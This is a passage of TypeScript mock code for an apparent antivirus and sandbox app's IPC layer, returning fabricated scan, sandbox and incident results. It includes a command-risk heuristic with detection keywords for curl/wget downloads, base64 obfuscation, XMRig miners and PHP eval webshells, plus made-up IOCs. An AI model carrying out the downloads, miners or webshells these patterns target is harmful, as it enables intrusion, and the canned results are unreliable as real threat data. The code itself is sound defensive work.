      state.networkAttacks.unshift(newAtk);
      emit("net-attack", newAtk);
      return { status: "simulated", attack: newAtk } as unknown as T;
    }

    case "list_sandbox_reports": {
      return state.sandboxReports as unknown as T;
    }

    case "launch_sandbox_jail": {
      const sample = args.sample_name || "sample.bin";
      const family = args.family || "Trojan";
      const jail_id = `jail-${Math.random().toString(36).substring(2, 10)}`;
      const report: SandboxAnalysisReport = {
        jail_id,
        sample_name: sample,
        family,
        status: "analyzed",
        isolation_type: args.isolation_type || "Linux-Namespace-Cgroup-v2 (Loopback Sinkhole)",
        network_confinement: args.network_confinement || "AIR-GAPPED (Loopback Sinkhole)",
        sha256: hashString(sample + Date.now()),
        created_at: new Date().toISOString(),
        runtime_ms: 1850,
        blueprint: {
          dynamic_risk_rating: 85,
          threat_level: "HIGH",
          threat_summary: `Detonation of '${sample}' within isolated cgroup v2 namespace intercepted unauthorized syscalls.`,
          killchain_phase: "Execution & Evasion",
          evasion_mechanisms: ["Anti-Debugging Checks", "Timing Evasion"],
          unpacking_detected: true,
          remediation_command: `aegis quarantine --jail ${jail_id} && aegis wipe --sample '${sample}'`,
        },
        extracted_iocs: {
          ips: ["194.26.29.112"],
          domains: ["sinkholed-beacon.cc"],
          dropped_files: [`/tmp/${jail_id}/dropped_helper.bin`],
          mutex_or_pipes: [`Global\\Aegis_${jail_id}`],
        },
        mitre_techniques_observed: ["T1059: Command and Scripting Interpreter", "T1027: Obfuscated Files"],
        observed_behaviors: [
          {
            timestamp: new Date().toISOString(),
            category: "Process",
            operation: "sys_clone(CLONE_NEWPID | CLONE_NEWNET)",
            target: "Kernel Subsystem",
            risk: "medium",
            severity: "medium",
            description: "Namespace sandbox isolated process from host filesystem & network.",
            mitre: "T1059",
          },
          {
            timestamp: new Date().toISOString(),
            category: "Filesystem",
            operation: "sys_open(/etc/shadow, O_RDONLY)",
            target: "/etc/shadow",
            risk: "critical",
            severity: "critical",
            description: "Attempted sensitive credential read (access denied by isolation namespace).",
            mitre: "T1003",
          },
        ],
      };
      state.sandboxReports.unshift(report);
      return report as unknown as T;
    }

    case "terminate_sandbox_jail": {
      state.sandboxReports = state.sandboxReports.filter((r) => r.jail_id !== args.jailId);
      return true as unknown as T;
    }

    case "list_virus_signatures": {
      return state.signatures as unknown as T;
    }

    case "list_malware_results": {
      return state.malwareResults as unknown as T;
    }

    case "list_user_whitelisted_apps": {
      return state.whitelistedApps as unknown as T;
    }

    case "trust_user_app": {
      state.whitelistedApps.push({
        id: args.id || `app-${Date.now()}`,
        name: args.name || args.path,
        path: args.path,
        added_ts: Date.now(),
      });
      return { status: "trusted", path: args.path } as unknown as T;
    }

    case "remove_user_whitelisted_app": {
      state.whitelistedApps = state.whitelistedApps.filter((a) => a.path !== args.path);
      return true as unknown as T;
    }

    case "get_av_stats": {
      const stats: AvEngineStats = {
        engine_status: "ARMED & LIVE",
        engine_version: "4.6.0",
        db_version: "2026.11.12-R4",
        signatures_loaded: state.signatures.length,
        files_scanned: 18420,
        threats_blocked: 42,
        quarantined_count: 5,
        quarantined_files: 5,
        last_update: "10 minutes ago",
        auto_remediation_enabled: true,
      };
      return stats as unknown as T;
    }

    case "scan_malware_target":
    case "test_malware_sample": {
      const sample = args.sample_type || args.path || "test_payload.bin";
      const isXmr = sample.includes("xmrig") || sample.includes("miner");
      const isRansom = sample.includes("deadbolt") || sample.includes("ransom");
      const result: MalwareScanResult = {
        id: `scan-${Date.now()}`,
        target_path: `/tmp/${sample}`,
        file_path: `/tmp/${sample}`,
        is_infected: true,
        threat_name: isXmr ? "Linux/Miner.XMRig.Stratum" : isRansom ? "Generic/Ransom.Note" : "Generic/Packed.UPX",
        malware_name: isXmr ? "XMRig Cryptominer" : isRansom ? "Deadbolt Ransomware" : "UPX Packed Trojan",
        rule_matched: isXmr ? "AV-SIG-002: Stratum Protocol" : isRansom ? "AV-SIG-004: Ransom Note" : "AV-SIG-001: UPX Signature",
        detection_method: "Heuristic Signature Match",
        family: isXmr ? "CoinMiner" : isRansom ? "Ransomware" : "Trojan",
        category: isXmr ? "CoinMiner" : isRansom ? "Ransomware" : "Packer",
        confidence: "HIGH",
        entropy: isRansom ? 7.965 : 7.620,
        file_size: 1048576,
        is_quarantined: false,
        quarantined: false,
        hash_sha256: hashString(sample + Date.now()),
        sha256: hashString(sample + Date.now()),
        indicators: [isXmr ? "stratum+tcp://" : isRansom ? "HIGH_ENTROPY_ENCRYPTED" : "UPX!"],
        remediation_status: "UNREMEDIATED",
        scanned_at: Date.now(),
        status: "infected",
      };
      state.malwareResults.unshift(result);
      return result as unknown as T;
    }

    case "quarantine_malware":
    case "confirm_malware_quarantine": {
      const target = state.malwareResults.find((m) => m.id === args.id);
      if (target) {
        target.is_quarantined = true;
        target.quarantined = true;
        target.remediation_status = "QUARANTINED_VAULT";
      }
      return { status: "quarantined", id: args.id } as unknown as T;
    }

    case "set_auto_remediation": {
      return (args.enabled ?? true) as unknown as T;
    }

    case "send_target_to_sandbox": {
      return { status: "sent_to_sandbox", id: args.id } as unknown as T;
    }

    case "get_storage_stats": {
      return state.storageStats as unknown as T;
    }

    case "get_auto_prune_config": {
      return state.autoPruneConfig as unknown as T;
    }

    case "update_auto_prune_config": {
      state.autoPruneConfig = { ...state.autoPruneConfig, ...args };
      return state.autoPruneConfig as unknown as T;
    }

    case "prune_logs": {
      const freed = 1048576 * 3;
      state.storageStats.temp_files_bytes = Math.max(512000, state.storageStats.temp_files_bytes - freed);
      state.storageStats.last_prune_ts = Date.now();
      state.storageStats.last_pruned_ts = Date.now();
      const res: PruneResult = {
        success: true,
        freed_bytes: freed,
        debug_entries_deleted: 14,
        pruned_debug_entries: 14,
        temp_files_deleted: 3,
        pruned_temp_files: 3,
        sandbox_artifacts_deleted: 1,
        pcap_buffers_deleted: 1,
        timestamp: Date.now(),
      };
      return res as unknown as T;
    }

    case "list_debug_log": {
      const limit = args.limit || 50;
      const offset = args.offset || 0;
      return state.debugLog.slice(offset, offset + limit) as unknown as T;
    }

    case "list_telemetry": {
      const limit = args.limit || 120;
      return state.telemetry.slice(0, limit) as unknown as T;
    }

    case "simulate_movement_scenario": {
      const scenario = args.scenario || "virus_xmrig";
      const isMiner = scenario.includes("xmrig");
      const isRansom = scenario.includes("deadbolt");
      const name = isMiner ? "xmrig" : isRansom ? "deadbolt.bin" : "bash";
      const newInc: ThreatIncident = {
        id: `inc-sim-${Date.now()}`,
        kind: "movement_simulation",
        severity: "critical",
        risk_score: 95,
        pid: 8820,
        ppid: 1000,
        process: name,
        cmdline: [name, "--scenario", scenario],
        exe_path: `/tmp/${name}`,
        rule: isMiner ? "PAR-006: Cryptominer Process Spawned" : "ENT-001: Mass File Encryption Detected",
        confidence: "high",
        reason: `Automated detection simulation for movement scenario '${scenario}' executed and intercepted.`,
        ancestors: [1000, 1],
        ts: new Date().toISOString(),
        resolved: false,
        digest: hashString(scenario + Date.now()),
        flags: ["SIMULATED_SCENARIO", "INTERCEPTED_LIVE"],
        factors: [{ name: "Scenario Triggered", impact: 75, score: 75 }],
        movement_steps: [{ ts: Date.now(), event: "Simulation Injection", detail: `Scenario '${scenario}' spawned test process`, delta: 75 }],
      };
      state.incidents.unshift(newInc);
      emit("anomaly", newInc);
      return {
        message: `Simulation scenario '${scenario}' executed — real-time anomaly event emitted!`,
      } as unknown as T;
    }

    case "evaluate_command": {
      const cmdStr = args.command || args.evalCmd || "";
      const lower = cmdStr.toLowerCase();
      let risk = 10;
      const flags: string[] = [];
      const factors: any[] = [];
      let verdict = "clean";
      let mitre_tactic = "Execution";
      let mitre_technique = "Command and Scripting Interpreter (T1059)";
      let virus_match: any = null;

      if (lower.includes("base64") || lower.includes("-e ")) {
        risk += 45;
        flags.push("BASE64_OBFUSCATION");
        factors.push({ name: "Base64 Obfuscation", impact: 45, desc: "Piped decode bypasses signature scans" });
        mitre_tactic = "Defense Evasion";
        mitre_technique = "Deobfuscate/Decode Files (T1027)";
      }
      if (lower.includes("curl") || lower.includes("wget") || lower.includes("http")) {
        risk += 30;
        flags.push("NETWORK_INGRESS");
        factors.push({ name: "Ingress Download", impact: 30, desc: "Remote payload fetch from external URL" });
      }
      if (lower.includes("xmrig") || lower.includes("stratum")) {
        risk += 50;
        flags.push("VIRUS_MATCH");
        factors.push({ name: "Cryptominer Signature", impact: 50, desc: "XMRig / Stratum protocol detected" });
        virus_match = { name: "Linux/Miner.XMRig.Stratum", family: "CoinMiner" };
      }
      if (lower.includes("eval(") || lower.includes("c99")) {
        risk += 60;
        flags.push("WEBSHELL_EXEC");
        factors.push({ name: "Webshell Code Execution", impact: 60, desc: "Remote PHP arbitrary code execution" });
        virus_match = { name: "PHP/Webshell.EvalPost", family: "WebShell" };
      }

      if (risk >= 70) verdict = "alert";
      else if (risk >= 40) verdict = "monitored";

      return {
        verdict,
        score: Math.min(risk, 100),
        flags,
        factors,
        mitre_tactic,
        mitre_technique,
        explanation: `Command evaluated with ${factors.length} active heuristic factor(s). Risk score: ${Math.min(risk, 100)}/100.`,
        virus_match,
      } as unknown as T;
    }

    case "record_telemetry_event": {
      return true as unknown as T;
    }

    default: {
      console.warn(`[Aegis IPC Mock] Unhandled command '${cmd}' with args:`, args);
      return {} as unknown as T;
    }
  }
}
